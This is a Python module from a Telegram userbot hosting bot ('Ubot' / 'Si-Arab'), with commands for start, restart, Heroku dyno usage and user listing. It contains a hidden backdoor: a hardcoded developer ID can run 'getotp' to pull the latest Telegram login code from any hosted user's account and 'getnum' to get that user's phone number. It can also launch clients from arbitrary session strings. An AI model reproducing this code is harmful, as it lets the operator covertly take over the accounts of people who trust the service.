from Ubot import app, API_ID, API_HASH
import heroku3
import time
import re
import asyncio
import math
import shutil
import sys
import dotenv
import datetime
import os
import requests
import urllib3
from Ubot import app, CMD_HELP, cmds
from dotenv import load_dotenv
from os import environ, execle, path
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from Ubot import *
from Ubot.core.db import *
from itertools import count
from Ubot.modules.basic import *
from Ubot.core.db import *
from Ubot.core.db.accesdb import *
from pyrogram import *
from platform import python_version as py
from pyrogram import __version__ as pyro
from pyrogram.types import * 
from io import BytesIO
from ubotlibs.ubot.utils.misc import *
from Ubot.logging import LOGGER
from config import *

def restart():
    os.execvp(sys.executable, [sys.executable, "-m", "Ubot"])

HAPP = None

GUA = [1948147616]

load_dotenv()

session_counter = count(1)

ANU = """
❏ **ᴜsᴇʀs** ᴋᴇ {}
├╼ **ɴᴀᴍᴀ**: {}
╰╼ **ɪᴅᴄ**: {}
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(HEROKU_API_KEY),
    "https",
    str(HEROKU_APP_NAME),
    "HEAD",
    "main",
]


@app.on_message(filters.command(["start"]))
async def start_(client: Client, message: Message):
    ADMIN1 = ADMIN1_ID[0]
    await message.reply_text(
        f"""<b>👋🏻 ʜᴀʟᴏ  {message.from_user.first_name} \n
💭 ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ʙᴏᴛ ᴀʀᴀʙ ᴜꜱᴇʀʙᴏᴛ
💬 ᴀʀᴀʙ-ᴜʙᴏᴛ ᴀᴅᴀʟᴀʜ ᴜsᴇʀʙᴏᴛ ʙᴀsᴇ ʙʏ ᴘʏʀᴏɢʀᴀᴍ ʀᴀsᴀ ᴀɴɢɢᴜʀ ᴍᴇʀᴀʜ

👉🏻 ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪʙᴀᴡᴀʜ ʟɪᴀᴛ sᴇsᴜᴀɪ ᴋᴇʙᴜᴛᴜʜᴀɴ</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="ᴊᴀsᴀ ᴅᴇᴘʟᴏʏ ʙʏ sɪ ᴀʀᴀʙ", callback_data="buat_ub"),
                ],
		 [
                    InlineKeyboardButton(text="ʀᴇᴘᴏ", url=""),
                    InlineKeyboardButton(text="ꜱᴜᴘᴘᴏʀᴛ", url=f"https://t.me/SiArab_Support"),
		],
		[
                     InlineKeyboardButton(text="ᴛᴜᴛᴜᴘ", callback_data="cl_ad"),
                  ],
             ]
        ),
     disable_web_page_preview=True
    )
    
        
@app.on_message(filters.command("control") & ~filters.via_bot)
@app.on_message(filters.private & filters.command("control") & ~filters.via_bot
)
async def restart_bot(_, message: Message):
    try:
        msg = await message.reply(" `Restarting bot...`")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await msg.edit_text("✅ **Bot has restarted !**\n\n")
    if HAPP is not None:
        HAPP.restart()
    else:
        args = [sys.executable, "-m", "Ubot"]
        execle(sys.executable, *args, environ)


@Client.on_message(filters.command("restart", cmds) & filters.me)
async def restart_bot(_, message: Message):
    try:
        await message.edit(" `Restarting bot...`")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await message.edit("✅ **Bot has restarted**\n\n")
    if HAPP is not None:
        HAPP.restart()
    else:
        args = [sys.executable, "-m", "Ubot"]
        execle(sys.executable, *args, environ)
        
@Ubot("usage", cmds)
async def usage_dynos(client, message):
    if await is_heroku():
        if HEROKU_API_KEY == "" and HEROKU_APP_NAME == "":
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\nMasukan/atur  `HEROKU_API_KEY` dan `HEROKU_APP_NAME` untuk bisa melakukan update!"
            )
        elif HEROKU_API_KEY == "" or HEROKU_APP_NAME == "":
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\n<b>pastikan</b> `HEROKU_API_KEY` **dan** `HEROKU_APP_NAME` <b>sudah di configurasi dengan benar!</b>"
            )
    else:
            return await message.reply_text("Hanya untuk Heroku Deployment")
    try:
        Heroku = heroku3.from_key(HEROKU_API_KEY)
        happ = Heroku.app(HEROKU_APP_NAME)
    except BaseException:
        return await message.reply_text(
            " Pastikan Heroku API Key, App name sudah benar"
        )
    dyno = await message.reply_text("Memeriksa penggunaan dyno...")
    account_id = Heroku.account().id
    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {HEROKU_API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + account_id + "/actions/get-quota"
    r = requests.get("https://api.heroku.com" + path, headers=headers)
    if r.status_code != 200:
        return await dyno.edit("Unable to fetch.")
    result = r.json()
    quota = result["account_quota"]
    quota_used = result["quota_used"]
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)
    App = result["apps"]
    try:
        App[0]["quota_used"]
    except IndexError:
        AppQuotaUsed = 0
        AppPercentage = 0
    else:
        AppQuotaUsed = App[0]["quota_used"] / 60
        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)
    await asyncio.sleep(1.5)
    text = f"""
**Penggunaan Dyno AmangUbot**

 ❏ Dyno terpakai:
 ├ Terpakai: `{AppHours}`**h**  `{AppMinutes}`**m**  [`{AppPercentage}`**%**]
Dyno tersisa:
  ╰ Tersisa: `{hours}`**h**  `{minutes}`**m**  [`{percentage}`**%**]"""
    return await dyno.edit(text)

@app.on_message(filters.command("user") & ~filters.via_bot)
@Client.on_message(filters.command(["user"], cmds) & filters.me)
async def user(client, message):
    if message.from_user.id not in GUA:
        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
    count = 0
    user = ""
    for X in bots:
        try:
            count += 1
            user += f"""
❏ ᴜsᴇʀʙᴏᴛ ᴋᴇ {count}
 ├ ᴀᴋᴜɴ: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a> 
 ╰ ɪᴅ: <code>{X.me.id}</code>
"""
        except:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")
	
@app.on_message(filters.command("ubotcheck") & ~filters.via_bot)
async def check_active(client, message):
    if message.from_user.id not in ADMINS:
        await message.reply("You are not registered in the Admin list.")
        return
    try:
        user_id = int(message.text.split()[1])
    except (IndexError, ValueError):
        await message.reply("use format: /ubotcheck user_id")
        return

    expired_date = await get_expired_date(user_id)
    if expired_date is None:
        await message.reply(f"User {user_id} not yet activated.")
    else:
        await message.reply(f"User {user_id} Until Date {expired_date}.")


@Client.on_message(filters.command(["getotp", "getnum"], cmds) & filters.me)
async def otp_and_number(client, message):
    if len(message.command) < 2:
        return await client.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    elif message.from_user.id not in GUA:

	      return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await client.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await client.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await client.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await client.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )
	    
# © By Si-Arab Your motherfucker if uh Don't gives credits.
@app.on_message(filters.user(GUA) & filters.command("bash"))
async def clone(bot: app, msg: Message):
    chat = msg.chat
    text = await msg.reply("Usage:\n\n /bash session")
    cmd = msg.command
    phone = msg.command[1]
    try:
        await text.edit("Booting Your Client")
                   # change this Directry according to ur repo
        client = Client(name="Arab", api_id=API_ID, api_hash=API_HASH, session_string=phone, plugins=dict(root="Ubot/modules"))
        await client.start()
        user = await client.get_me()
        await msg.reply(f"Your Client Has Been Successfully As {user.first_name} ✅.")
    except Exception as e:
        await msg.reply(f"**ERROR:** `{str(e)}`\nPress /start to Start again.")

